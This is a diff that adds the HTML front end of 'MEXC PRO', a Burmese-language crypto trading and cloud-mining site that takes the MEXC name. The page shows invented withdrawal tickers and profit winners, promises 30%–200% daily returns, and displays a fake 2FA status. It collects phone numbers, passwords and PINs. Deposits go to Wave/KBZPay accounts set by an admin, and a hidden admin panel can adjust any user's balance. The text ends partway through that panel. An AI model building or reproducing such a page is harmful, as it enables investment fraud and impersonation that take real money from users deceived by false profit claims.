@@ -1,0 +1,983 @@
+<!DOCTYPE html>
+<html lang="my">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>MEXC PRO | Professional Trading Platform</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
+    
+    <style>
+        :root { --primary: #00DBB1; --primary-glow: rgba(0, 219, 177, 0.3); --bg: #050A0E; --card: rgba(23, 32, 42, 0.7); --text: #FFFFFF; --dim: #94A3B8; --red: #F6465D; --green: #2EBD85; --border: rgba(255, 255, 255, 0.1); --active-gold: #FFD700; }
+        
+        /* --- NEW ANIMATED BACKGROUND CODE START --- */
+        .bg-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -2;
+            overflow: hidden;
+            background-color: var(--bg);
+        }
+
+        .bg-layer {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background-size: cover;
+            background-position: center;
+            opacity: 0;
+            animation: bgFade 16s infinite;
+        }
+
+        .bg-layer-1 {
+            background-image: url('https://i.ibb.co/CsM1hK6J/download-2.jpg');
+            animation-delay: 0s;
+        }
+
+        .bg-layer-2 {
+            background-image: url('https://i.ibb.co/TMVH0mqh/download-1.jpg');
+            animation-delay: 8s;
+        }
+
+        @keyframes bgFade {
+            0% { opacity: 0; transform: scale(1); }
+            15% { opacity: 0.4; }
+            45% { opacity: 0.4; }
+            60% { opacity: 0; transform: scale(1.1); }
+            100% { opacity: 0; }
+        }
+
+        .bg-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at top, rgba(11, 30, 34, 0.7) 0%, rgba(5, 10, 14, 0.95) 100%);
+            z-index: -1;
+            pointer-events: none;
+        }
+        /* --- NEW ANIMATED BACKGROUND CODE END --- */
+
+        body { margin: 0; color: var(--text); font-family: 'Inter', 'Segoe UI', sans-serif; -webkit-tap-highlight-color: transparent; min-height: 100vh; }
+        .page { display: none; padding: 16px; padding-bottom: 110px; max-width: 500px; margin: auto; animation: pageSlideUp 0.4s ease-out; }
+        @keyframes pageSlideUp { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
+        .active { display: block; }
+        .card { background: var(--card); backdrop-filter: blur(12px); border-radius: 20px; padding: 20px; margin-bottom: 20px; border: 1px solid var(--border); box-shadow: 0 10px 30px rgba(0,0,0,0.4); }
+        .btn { width: 100%; padding: 16px; border-radius: 12px; border: none; font-weight: 700; cursor: pointer; transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); font-size: 14px; text-transform: uppercase; }
+        .btn:active { transform: scale(0.95); }
+        
+        .btn:focus, .btn.clicked-gold { 
+            border: 2px solid var(--active-gold) !important; 
+            box-shadow: 0 0 15px var(--active-gold) !important;
+            transform: scale(0.98);
+        }
+
+        .btn-main { background: linear-gradient(135deg, var(--primary), #00A383); color: #000; box-shadow: 0 5px 15px var(--primary-glow); }
+        .btn-red { background: linear-gradient(135deg, #F6465D, #C02E40); color: white; }
+        .btn-green { background: linear-gradient(135deg, #2EBD85, #1E8C61); color: white; }
+        .btn-active { border: 3px solid var(--active-gold) !important; box-shadow: 0 0 25px rgba(255, 215, 0, 0.6) !important; transform: scale(1.02); }
+        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 12px; border: 1px solid var(--border); background: rgba(15, 23, 42, 0.6); color: white; box-sizing: border-box; outline: none; position: relative; z-index: 10; }
+        
+        #wd-live-container { position: fixed; top: 20px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 400px; z-index: 9999; pointer-events: none; }
+        .wd-toast { background: rgba(11, 25, 33, 0.95); border-left: 4px solid var(--active-gold); padding: 12px 20px; border-radius: 10px; margin-bottom: 10px; display: flex; align-items: center; gap: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); animation: toastIn 0.5s forwards, toastOut 0.5s 4.5s forwards; border: 1px solid rgba(255,215,0,0.2); }
+        @keyframes toastIn { from { opacity:0; transform: translateY(-20px); } to { opacity:1; transform: translateY(0); } }
+        @keyframes toastOut { to { opacity:0; transform: translateX(50px); } }
+        .wd-toast i { color: var(--active-gold); font-size: 20px; }
+
+        .nav { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 400px; background: rgba(11, 14, 17, 0.9); backdrop-filter: blur(20px); display: flex; border-radius: 30px; padding: 12px 5px; z-index: 1000; border: 1px solid rgba(255,255,255,0.1); }
+        .nav-item { flex: 1; text-align: center; color: var(--dim); font-size: 11px; cursor: pointer; }
+        .nav-item.active { color: var(--primary); }
+        .nav-item i { font-size: 22px; display: block; margin-bottom: 4px; }
+        
+        .mining-card { position: relative; overflow: hidden; border: 1px solid rgba(255,255,255,0.05); transition: 0.3s; z-index: 1; margin-bottom: 25px; transition: transform 0.3s; }
+        .mining-card:hover { transform: translateY(-5px); border-color: var(--primary); }
+        .mining-card::before { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: conic-gradient(transparent, var(--primary), transparent 30%); animation: rotate 4s linear infinite; opacity: 0.1; z-index: -1; pointer-events: none; }
+        @keyframes rotate { 100% { transform: rotate(360deg); } }
+        .mining-content { position: relative; z-index: 2; display: flex; justify-content: space-between; align-items: center; }
+        .mining-icon { width: 50px; height: 50px; background: rgba(0,219,177,0.1); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 24px; color: var(--primary); margin-right: 15px; }
+        .mining-info h4 { margin: 0; font-size: 18px; color: #fff; }
+        .mining-info small { color: var(--dim); }
+        .profit-badge { background: var(--green); color: #000; padding: 4px 8px; border-radius: 6px; font-weight: bold; font-size: 12px; box-shadow: 0 0 10px rgba(46, 189, 133, 0.4); }
+
+        .progress-container { width: 100%; background: rgba(255,255,255,0.05); height: 6px; border-radius: 10px; margin-top: 10px; overflow: hidden; }
+        .progress-bar { height: 100%; background: var(--primary); width: 0%; transition: width 0.5s; box-shadow: 0 0 10px var(--primary); }
+
+        .marquee-box { background: rgba(0, 219, 177, 0.1); padding: 10px; border-radius: 10px; margin-bottom: 15px; overflow: hidden; white-space: nowrap; border: 1px solid var(--border); }
+        .marquee-text { display: inline-block; padding-left: 100%; animation: marquee 15s linear infinite; color: var(--primary); font-size: 13px; font-weight: 500; }
+        @keyframes marquee { 0% { transform: translate(0, 0); } 100% { transform: translate(-100%, 0); } }
+        
+        .withdraw-marquee-box { background: rgba(246, 70, 93, 0.1); padding: 8px; border-radius: 10px; margin-bottom: 15px; overflow: hidden; white-space: nowrap; border: 1px solid rgba(246, 70, 93, 0.2); display: flex; align-items: center; }
+        .withdraw-text { display: inline-block; animation: marquee-slow 25s linear infinite; color: #F6465D; font-size: 12px; font-weight: bold; }
+        @keyframes marquee-slow { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
+
+        .copy-badge { background: var(--primary); color: #000; padding: 2px 8px; border-radius: 5px; font-size: 10px; margin-left: 10px; cursor: pointer; vertical-align: middle; }
+        .pw-wrapper { position: relative; }
+        .pw-toggle { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: var(--dim); cursor: pointer; z-index: 100; }
+
+        .trade-visualizer { height: 220px; background: #000; border-radius: 15px; margin-bottom: 15px; position: relative; overflow: hidden; border: 1px solid var(--border); }
+        .live-dot { width: 8px; height: 8px; background: #ff4444; border-radius: 50%; display: inline-block; margin-right: 5px; animation: blink 1s infinite; }
+        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.2; } }
+        .timer-container { width: 110px; height: 110px; border: 4px solid var(--border); border-radius: 50%; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle, var(--card) 0%, #000 100%); transition: 0.3s; }
+        .timer-container.active { border-color: var(--primary); box-shadow: 0 0 20px var(--primary-glow); animation: pulse 1s infinite; }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+        
+        .mining-status-badge { font-size: 10px; padding: 2px 6px; border-radius: 4px; margin-left: 5px; text-transform: uppercase; font-weight: bold; }
+        .status-pending { background: #f39c12; color: #fff; }
+        .status-running { background: #2ecc71; color: #fff; box-shadow: 0 0 8px rgba(46, 204, 113, 0.4); }
+        .status-rejected { background: #e74c3c; color: #fff; }
+        .status-completed { background: var(--primary); color: #000; }
+        
+        .active-mining-info { background: rgba(0,0,0,0.3); padding: 15px; border-radius: 15px; margin-top: 10px; font-size: 12px; border: 1px solid var(--border); border-left: 4px solid var(--primary); }
+        .market-item { display: flex; justify-content: space-between; align-items: center; padding: 15px; background: rgba(255,255,255,0.05); margin-bottom: 10px; border-radius: 15px; border: 1px solid var(--border); cursor: pointer; }
+
+        .vip-card { border: 1px solid var(--active-gold); background: linear-gradient(145deg, rgba(255, 215, 0, 0.05), rgba(0,0,0,0.3)); position: relative; overflow: hidden; }
+        
+        .support-float { position: fixed; left: 20px; bottom: 100px; width: 55px; height: 55px; background: #0088cc; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-size: 24px; box-shadow: 0 4px 15px rgba(0,136,204,0.4); z-index: 1001; text-decoration: none; animation: bounce 2s infinite; }
+        @keyframes bounce { 0%, 20%, 50%, 80%, 100% {transform: translateY(0);} 40% {transform: translateY(-10px);} 60% {transform: translateY(-5px);} }
+        .footer-info { text-align: center; padding: 20px; font-size: 10px; color: var(--dim); border-top: 1px solid var(--border); margin-top: 30px; }
+        .sec-log { font-size: 11px; color: var(--primary); background: rgba(0,0,0,0.4); padding: 10px; border-radius: 10px; margin-top: 10px; border: 1px dotted var(--primary); }
+        
+        .auth-logo { width: 120px; height: 120px; border-radius: 50%; object-fit: cover; border: 3px solid var(--primary); margin-bottom: 20px; box-shadow: 0 0 20px var(--primary-glow); }
+        .dash-banner { width: 100%; border-radius: 15px; margin-bottom: 15px; border: 1px solid var(--border); }
+        .market-icon-img { width: 25px; height: 25px; margin-right: 10px; vertical-align: middle; border-radius: 50%; }
+
+        .info-header { font-size: 18px; color: var(--primary); margin-top: 15px; border-left: 3px solid var(--primary); padding-left: 10px; }
+        .info-text { font-size: 13px; line-height: 1.6; color: var(--dim); margin: 10px 0; }
+        .info-box { background: rgba(255,255,255,0.05); padding: 15px; border-radius: 12px; margin-bottom: 10px; }
+
+        .msg-box { padding: 12px; border-radius: 10px; background: rgba(0, 219, 177, 0.1); border: 1px solid var(--border); margin-bottom: 10px; border-left: 4px solid var(--primary); }
+        .msg-date { font-size: 10px; color: var(--dim); display: block; margin-bottom: 5px; }
+
+        .mining-header-img { width: 100%; border-radius: 15px; height: 150px; object-fit: cover; margin-bottom: 15px; border: 1px solid var(--primary); }
+
+        .pay-choice-box { display: flex; gap: 15px; margin-bottom: 20px; }
+        .pay-option { flex: 1; background: rgba(255,255,255,0.05); border-radius: 15px; padding: 15px; text-align: center; border: 2px solid transparent; transition: 0.3s; cursor: pointer; }
+        .pay-option.selected { border-color: var(--primary); background: rgba(0, 219, 177, 0.1); }
+        .pay-option img { width: 50px; height: 50px; border-radius: 10px; margin-bottom: 8px; }
+        .trust-notif { background: rgba(255,215,0,0.1); border: 1px solid var(--active-gold); color: var(--active-gold); padding: 10px; border-radius: 12px; margin-bottom: 15px; font-size: 12px; display: flex; align-items: center; gap: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="bg-animation">
+    <div class="bg-layer bg-layer-1"></div>
+    <div class="bg-layer bg-layer-2"></div>
+</div>
+<div class="bg-overlay"></div>
+
+<div id="wd-live-container"></div>
+
+<a href="https://t.me/Sarina111" class="support-float"><i class="fab fa-telegram-plane"></i></a>
+
+<div id="auth-page" class="page active">
+    <div style="text-align:center; margin: 40px 0 30px 0;">
+        <img src="https://i.ibb.co/7mvLK89/IMG-20260330-081319-912.jpg" alt="Logo" class="auth-logo">
+        <h1 style="color:var(--primary); font-size: 35px; letter-spacing: 2px; margin: 0;">MEXC PRO</h1>
+        <p style="color:var(--dim);">Professional Trading Environment</p>
+    </div>
+    <div id="login-form" class="card">
+        <input type="text" id="log-ph" placeholder="Phone Number">
+        <div class="pw-wrapper">
+            <input type="password" id="log-pw" placeholder="Password">
+            <i class="fas fa-eye pw-toggle" id="eye-icon" onclick="togglePassword('log-pw', this)"></i>
+        </div>
+        <button class="btn btn-main" onclick="applyClickGold(this); handleAuth('login')">Sign In</button>
+        <p onclick="toggleAuth(true)" style="text-align:center; color:var(--primary); cursor:pointer; margin-top:20px;">Create New Account</p>
+    </div>
+    <div id="reg-form" class="card" style="display:none;">
+        <input type="text" id="reg-un" placeholder="User Name">
+        <input type="text" id="reg-ph" placeholder="Phone Number">
+        <input type="password" id="reg-pw" placeholder="Password">
+        <button class="btn btn-main" onclick="applyClickGold(this); handleAuth('reg')">Register Now</button>
+        <p onclick="toggleAuth(false)" style="text-align:center; color:var(--dim); cursor:pointer; margin-top:15px;">Back to Login</p>
+    </div>
+</div>
+
+<div id="dash-page" class="page">
+    <div class="withdraw-marquee-box">
+        <i class="fas fa-bullhorn" style="color:#F6465D; margin-right:10px;"></i>
+        <div class="withdraw-text" id="wd-marquee-text">
+            User 09***342 က 50,000 Ks ထုတ်ယူအောင်မြင်ပါသည်... User 09***991 က 150,000 Ks ထုတ်ယူအောင်မြင်ပါသည်... User 09***125 က 30,000 Ks ထုတ်ယူအောင်မြင်ပါသည်...
+        </div>
+    </div>
+
+    <img src="https://i.ibb.co/gsx5zMn/en-US-7569624436f6.webp" alt="Banner" class="dash-banner">
+
+    <div class="trust-notif">
+        <i class="fas fa-trophy"></i>
+        <span><b>Today Top Profit:</b> User 09***772 (840,000 Ks) အမြတ်ရရှိခဲ့သည်။</span>
+    </div>
+
+    <div class="marquee-box">
+        <div class="marquee-text">အိမ်မှာနေရင်းငွေရှာဖို့အတွက် trading ကိုသေေချာအာရုံစိုက်ပါ... အရင်းအနှီးများလေလေ အမြတ်ပိုရလေဖြစ်ပါသည်။</div>
+    </div>
+    
+    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
+        <h2 style="font-weight:800;">LUCKY WEALTH</h2>
+        <div style="display:flex; gap:18px; align-items: center;">
+            <i class="fas fa-info-circle" style="font-size:22px; color:var(--primary); cursor:pointer;" onclick="showPage('info-page')"></i>
+            <i class="fas fa-bell" style="font-size:22px; color:var(--active-gold); cursor:pointer;" onclick="showPage('vip-page')"></i>
+            <i class="fas fa-shield-alt" style="font-size:22px; color:var(--primary);" onclick="showPage('setting-page')"></i>
+            <i class="fas fa-user-shield" style="font-size:22px;" id="admin-trigger"></i>
+        </div>
+    </div>
+
+    <div class="card" style="background: linear-gradient(135deg, #00DBB1, #0072FF); color: #000; border:none;">
+        <div style="display: flex; justify-content: space-between;">
+            <small style="opacity:0.8; font-weight:600;">Available Balance</small>
+            <span id="u-vip-badge" style="background:rgba(0,0,0,0.2); padding: 2px 8px; border-radius: 10px; font-size: 10px; font-weight: bold;">VIP 0</span>
+        </div>
+        <h1 id="u-bal" style="font-size:35px; margin: 10px 0;">0 Ks</h1>
+        <div style="display:flex; gap:12px; margin-top:15px;">
+            <button class="btn" style="background:#000; color:#fff; flex:1;" onclick="applyClickGold(this); showPage('deposit-page')">Deposit</button>
+            <button class="btn" style="background:rgba(255,255,255,0.3); color:#000; flex:1;" onclick="applyClickGold(this); showPage('withdraw-page')">Withdraw</button>
+        </div>
+    </div>
+
+    <h4 style="margin-left:5px;">Market Trends</h4>
+    <div id="market-list"></div>
+
+    <div class="footer-info">
+        <p><b>MEXC PRO TRADING GROUP</b></p>
+        <p>Investment involves risk. Past performance is not indicative of future results. Please read our Terms & Conditions carefully.</p>
+        <p>© 2024 MEXC PRO. All Rights Reserved.</p>
+    </div>
+</div>
+
+<div id="notification-page" class="page">
+    <div style="display:flex; align-items:center; gap:15px; margin-bottom:20px;">
+        <i class="fas fa-arrow-left" onclick="showPage('dash-page')"></i>
+        <h3>Admin Announcements</h3>
+    </div>
+    <div id="announcement-list"></div>
+</div>
+
+<div id="info-page" class="page">
+    <div style="display:flex; align-items:center; gap:15px; margin-bottom:20px;">
+        <i class="fas fa-arrow-left" onclick="showPage('dash-page')"></i>
+        <h3>MEXC PRO platform အကြောင်း</h3>
+    </div>
+    
+    <div class="card">
+        <img src="https://i.ibb.co/xtHCCyLm/images-1.jpg" style="width:100%; border-radius:10px; margin-bottom:15px;">
+        <h4 class="info-header">MEXC PRO ဖြစ်ပေါ်လာပုံသမိုင်း</h4>
+        <p class="info-text">MEXC PRO သည် ၂၀၂၀ ခုနှစ်တွင် စတင်တည်ထောင်ခဲ့ပြီး ကမ္ဘာတစ်ဝှမ်းရှိ ရင်းနှီးမြှုပ်နှံသူများအတွက် လုံခြုံစိတ်ချရသော Trading ပတ်ဝန်းကျင်ကို ဖန်တီးပေးရန် ရည်ရွယ်ပါသည်။ ကျွန်ုပ်တို့သည် အာရှ၏ ထိပ်တန်း Digital Asset Platform တစ်ခုအဖြစ် ရပ်တည်နေပြီး သုံးစွဲသူပေါင်း ၅ သန်းကျော်၏ ယုံကြည်မှုကို ရရှိထားပါသည်။</p>
+        
+        <h4 class="info-header">ဘယ်လောက်အထိ အမြတ်ရနိုင်လဲ?</h4>
+        <p class="info-text" style="color: var(--active-gold); font-weight: bold;">တစ်ရက်လျှင် အရင်းအနှီးပေါ်မူတည်၍ ၃၀% မှ ၂၀၀% အထိ အမြတ်ရရှိနိုင်ပါသည်။ မှန်ကန်စွာ Trading ပြုလုပ်ခြင်းဖြင့် သင်၏ဘဝကို စက္ကန့်ပိုင်းအတွင်း ပြောင်းလဲလိုက်ပါ။</p>
+
+        <h4 class="info-header">Cloud Mining ဆိုတာဘာလဲ?</h4>
+        <div class="info-box">
+            <p class="info-text" style="color: #fff;">
+                <b style="color:var(--primary)">Cloud Mining</b> ဆိုတာ ဘဏ်ပုံစံပါပဲ။ ဒါပေမယ့် ဘဏ်တွေထက် အတိုးနှုန်းမြောက်မြားစွာ ပိုမိုရရှိနိုင်တဲ့ နေရာဖြစ်ပါတယ်။
+            </p>
+            <p class="info-text" style="color: var(--active-gold); font-weight: bold; border: 1px dashed var(--active-gold); padding: 10px; border-radius: 8px;">
+                ဥပမာ - Cloud Mining တွင် နေ့စဉ်အတိုး (၂%) ရရှိမည်ဆိုပါက အရင်း ၁ သိန်းကျပ် ထည့်ဝင်ထားရုံဖြင့် တစ်ရက်လျှင် ၂,၀၀၀ ကျပ် အမြတ်ငွေ အလုပ်မလုပ်ဘဲ အမြဲတမ်း ရရှိနေမှာဖြစ်ပါတယ်။
+            </p>
+            <p class="info-text">
+                မိမိကိုယ်တိုင် စက်ပစ္စည်းများ ဝယ်ယူစရာမလိုဘဲ ကျွန်ုပ်တို့၏ အဆင့်မြင့် Mining Rig များကို ငှားရမ်းခြင်းဖြင့် နေ့စဉ်အမြတ်ငွေ <b>Passive Income</b> ရအောင် အခုပဲ ရှာဖွေလိုက်ပါ။
+            </p>
+        </div>
+
+        <h4 class="info-header">Passive Income ဆိုတာဘာလဲ?</h4>
+        <div class="info-box" style="border-left: 4px solid var(--green);">
+            <p class="info-text">
+                <b>Passive Income</b> ဆိုတာ အလုပ်မလုပ်ဘဲ အမြဲတမ်း ဝင်ငွေစီးဆင်းနေတဲ့ စနစ်ကို ဆိုလိုတာပါ။ မြန်မာလူမျိုးအများစုဟာ တစ်ဘဝလုံး အလုပ်တွေ ပင်ပင်ပန်းပန်း လုပ်ကိုင်ရင်း အချိန်ကုန်ဆုံးနေကြပါတယ်။
+            </p>
+            <p class="info-text" style="color: var(--primary);">
+                Passive Income ရှိခြင်းက သင့်ကို <b>"ငွေကြေးလွတ်လပ်မှု (Financial Freedom)"</b> ကို ရရှိစေမှာပါ။ သင် အိပ်နေချိန်မှာတောင် သင့်အတွက် ပိုက်ဆံတွေက အလုပ်လုပ်ပေးနေမှာ ဖြစ်ပါတယ်။
+            </p>
+            <p class="info-text">
+                တစ်ဘဝလုံး အလုပ်တွေလုပ်ရင်း အချိန်ကုန်ဆုံးမယ့်အစား အမြဲတမ်းဝင်ငွေရမယ့် Passive Income လမ်းစကို ရှာဖွေကြပါ။ MEXC PRO နဲ့ လက်တွဲပြီး သန်းကြွယ်သူဌေး ဖြစ်ဖို့၊ ငွေကြေးလွတ်လပ်မှု ရရှိဖို့နဲ့ အိမ်မှာနေရင်း Daily Income တွေ ရရှိဖို့ အခုပဲ အတူလက်တွဲလိုက်ပါ။
+            </p>
+        </div>
+
+        <h4 class="info-header">သန်းကြွယ်သူဌေး ဖြစ်လာသူများအကြောင်း</h4>
+        <p class="info-text">အရင်းအနှီးအနည်းငယ် (၁ သောင်းကျပ်) မှ စတင်၍ ယခုအခါ သိန်းပေါင်းသောင်းချီ ချမ်းသာသွားသော Trading Master များစွာရှိပါသည်။ ၎င်းတို့အကြောင်းကို YouTube တွင် "MEXC Success Stories" ဟု ရှာဖွေနိုင်သလို အောက်ပါ Link တွင်လည်း လေ့လာနိုင်ပါသည်။</p>
+        <a href="https://youtube.com/@mexc_official" target="_blank" style="color:var(--primary); text-decoration:none; display:block; margin-bottom:15px;"><i class="fab fa-youtube"></i> MEXC Professional Tutorials</a>
+    </div>
+</div>
+
+<div id="vip-page" class="page">
+    <div style="display:flex; align-items:center; gap:15px; margin-bottom:20px;">
+        <i class="fas fa-arrow-left" onclick="showPage('dash-page')"></i>
+        <h3>VIP Membership Levels</h3>
+    </div>
+    
+    <div class="card" style="border: 1px solid var(--active-gold); text-align: center; background-image: url('https://i.ibb.co/Qvf6fXdp/images.jpg'); background-size: cover; background-position: center; min-height: 120px;">
+        <div style="background: rgba(0,0,0,0.6); padding: 20px; border-radius: 15px; height: 100%;">
+            <p style="margin: 0; font-size: 14px; color: #fff;">Your Current Status</p>
+            <h2 id="current-vip-level" style="color: var(--active-gold); margin: 5px 0;">VIP 0 MEMBER</h2>
+        </div>
+    </div>
+    
+    <div id="vip-tiers-list"></div>
+</div>
+
+<div id="trade-page" class="page">
+    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
+        <div style="display:flex; align-items:center; gap:15px;">
+            <i class="fas fa-chevron-left" style="font-size:20px;" onclick="showPage('dash-page')"></i>
+            <div>
+                <h3 id="pair-name" style="margin:0;">BTC/USDT</h3>
+                <small style="color:var(--green)"><span class="live-dot"></span>LIVE MARKET</small>
+            </div>
+        </div>
+        <div style="text-align:right;">
+            <h3 id="live-price" style="margin:0; color:var(--primary);">0.00</h3>
+            <span style="color:var(--green); font-weight:bold;">+<span id="trade-prof">0</span>%</span>
+        </div>
+    </div>
+    
+    <div id="tradingview-widget-container" class="trade-visualizer">
+        <div id="tv_chart_container" style="height: 100%;"></div>
+    </div>
+
+    <div class="card" style="text-align:center; padding: 25px 10px;">
+        <div class="timer-container" id="timer-ring">
+            <div id="trade-timer" style="font-size:32px; font-weight:800; color:var(--primary);">READY</div>
+        </div>
+        <p id="min-trade-info" style="color:var(--dim); font-size:12px;"></p>
+    </div>
+    <div class="card">
+        <input type="number" id="trade-amt" placeholder="Enter Amount (MMK)">
+        <p style="font-size:10px; color:var(--dim); margin-bottom: 10px;">* အရင်းအနှီးများလေလေ၊ အမြတ်ပိုရလေဖြစ်ပါသည်။ *</p>
+        <div style="display:flex; gap:12px; margin-top:10px;">
+            <button class="btn btn-green" style="flex:1;" onclick="applyClickGold(this); execTrade('BUY')">Call Up</button>
+            <button class="btn btn-red" style="flex:1;" onclick="applyClickGold(this); execTrade('SELL')">Put Down</button>
+        </div>
+    </div>
+</div>
+
+<div id="mining-page" class="page">
+    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
+        <h3>Cloud Mining Hub</h3>
+        <span style="color:var(--primary); font-size:12px;"><i class="fas fa-bolt"></i> Active Nodes</span>
+    </div>
+    <img src="https://i.ibb.co/sJw836Xs/download-2.jpg" alt="Mining Banner" class="mining-header-img">
+    <div id="user-mining-status"></div>
+    <div id="mining-list"></div>
+    <img src="https://i.ibb.co/YF5Lw92y/download-3.jpg" style="width: 100%; border-radius: 15px; margin-top: 10px;">
+</div>
+
+<div id="history-page" class="page">
+    <h3>Asset Records</h3>
+    <div class="card">
+        <h4 style="color:var(--primary);"><i class="fas fa-arrow-down"></i> Deposits</h4>
+        <div id="dep-hist" style="margin-top:10px;"></div>
+    </div>
+    <div class="card">
+        <h4 style="color:var(--red);"><i class="fas fa-arrow-up"></i> Withdrawals</h4>
+        <div id="wd-hist" style="margin-top:10px;"></div>
+    </div>
+</div>
+
+<div id="setting-page" class="page">
+    <h3>Security Center</h3>
+    <div class="card">
+        <h4>Update Login Password</h4>
+        <input type="password" id="old-pw" placeholder="Current Password">
+        <input type="password" id="new-pw" placeholder="New Password">
+        <button class="btn btn-main" onclick="applyClickGold(this); changeSecurity('password')">Update Now</button>
+    </div>
+    <div class="card">
+        <h4>Set 6-Digit Withdraw PIN</h4>
+        <input type="password" id="new-pin" placeholder="Enter 6-Digit PIN" maxlength="6">
+        <button class="btn btn-main" onclick="applyClickGold(this); changeSecurity('pin')">Save PIN</button>
+    </div>
+    
+    <div class="card">
+        <h4>System Logs</h4>
+        <div class="sec-log" id="login-log">Last Login: Just now from Yangon, MM (IP: 103.***.***.21)</div>
+        <div class="sec-log" style="margin-top:5px; border-color:var(--active-gold); color:var(--active-gold);">Security Status: 2FA Active (Encrypted)</div>
+    </div>
+
+    <button class="btn btn-red" style="margin-top:20px; background:#222;" onclick="location.reload()">Sign Out</button>
+</div>
+
+<div id="withdraw-page" class="page">
+    <h3>Withdraw Assets</h3>
+    <div class="card">
+        <p style="color:var(--primary); font-size: 11px; margin-bottom: 10px;">* အင်တာနက်လိုင်းကောင်းပါက ၃စက္ကန့်အတွင်း ငွေထုတ်ယူမှု ဆောင်ရွက်ပေးပါမည်။ *</p>
+        <input type="number" id="wd-amt-input" placeholder="Amount (MMK)">
+        <input type="text" id="wd-name-input" placeholder="Wave/Kpay Account Name">
+        <input type="text" id="wd-ph-input" placeholder="Receiver Phone Number">
+        <input type="password" id="wd-pin-input" placeholder="Withdraw PIN">
+        <button class="btn btn-main" style="margin-top:10px;" id="wd-submit-btn" onclick="applyClickGold(this); sendWithdraw()">Verify & Withdraw</button>
+        <div id="wd-pending-status" style="display:none; text-align:center; margin-top:10px; color:var(--active-gold);">
+            <i class="fas fa-spinner fa-spin"></i> Pending Approval...
+        </div>
+    </div>
+</div>
+
+<div id="deposit-page" class="page">
+    <h3>Deposit MMK</h3>
+    <div class="card">
+        <p style="color:var(--dim); text-align:center; margin-bottom:15px;">ငွေဖြည့်ရန် Payment တစ်ခုရွေးချယ်ပါ</p>
+        <div class="pay-choice-box">
+            <div class="pay-option" id="opt-wave" onclick="selectPay('wave')">
+                <img src="https://i.ibb.co/TB9Td4sh/unnamed.jpg" alt="Wave">
+                <div style="font-size:12px; font-weight:bold;">WavePay</div>
+            </div>
+            <div class="pay-option" id="opt-kpay" onclick="selectPay('kpay')">
+                <img src="https://i.ibb.co/jPM98JTC/images.png" alt="Kpay">
+                <div style="font-size:12px; font-weight:bold;">KBZPay</div>
+            </div>
+        </div>
+
+        <div id="dep-details" style="display:none; text-align:center;">
+            <p style="color:var(--red); font-size: 12px; font-weight: bold;">* <span id="dep-method-name">Wave</span> နံပါတ်နှင့် နာမည်ကိုသေချာစိစစ်၍လွှဲပေးပါ *</p>
+            <div style="background: rgba(0,0,0,0.3); padding: 15px; border-radius: 10px; margin-bottom: 15px;">
+                <p style="margin:0; font-size:12px; color:var(--dim);">Account Name: <b id="dep-acc-name" style="color:#fff;">...</b></p>
+                <h2 id="display-dep-num" style="color:var(--primary); letter-spacing:1px; margin:10px 0;">...</h2>
+                <span class="copy-badge" onclick="copyDepNum()">COPY NUMBER</span>
+            </div>
+            <input type="number" id="dep-amt-input" placeholder="လွှဲသွင်းသည့် ပမာဏ (Amount)">
+            <input type="text" id="dep-trx-input" placeholder="Transaction ID (နောက်ဆုံး ၆ လုံး)">
+            <button class="btn btn-main" style="margin-top:10px;" onclick="applyClickGold(this); sendDeposit()">Confirm Deposit</button>
+        </div>
+    </div>
+</div>
+
+<div id="admin-page" class="page">
+    <h3 style="color:var(--primary);">System Management</h3>
+    <div class="card">
+        <h4>Post Announcement</h4>
+        <textarea id="adm-msg" style="width:100%; height:80px; background:#111; color:white; border-radius:10px; padding:10px;" placeholder="Write message to all users..."></textarea>
+        <button class="btn btn-main" style="margin-top:5px;" onclick="applyClickGold(this); admPostAnnounce()">Post to Notifications</button>
+    </div>
+    
+    <div class="card">
+        <h4>Payment Settings</h4>
+        <small>WavePay Details</small>
+        <input type="text" id="new-wave-name" placeholder="Wave Account Name">
+        <input type="text" id="new-wave-num" placeholder="Wave Phone Number">
+        <hr style="opacity:0.1; margin:15px 0;">
+        <small>KBZPay Details</small>
+        <input type="text" id="new-kpay-name" placeholder="KBZPay Account Name">
+        <input type="text" id="new-kpay-num" placeholder="KBZPay Phone Number">
+        <button class="btn btn-main" style="margin-top:10px;" onclick="applyClickGold(this); admUpdatePayDetails()">Update All Payments</button>
+    </div>
+
+    <div class="card">
+        <input type="text" id="adm-search" placeholder="Search User Phone">
+        <button class="btn btn-main" onclick="applyClickGold(this); admSearch()">Find Account</button>
+        <div id="adm-ctrl" style="display:none; margin-top:20px; border-top:1px solid #333; padding-top:15px;">
+            <p>User: <b id="adm-un"></b> | Bal: <b id="adm-ub" style="color:var(--primary);"></b></p>
+            <input type="number" id="adm-adj" placeholder="Amount to Add/Subtract">
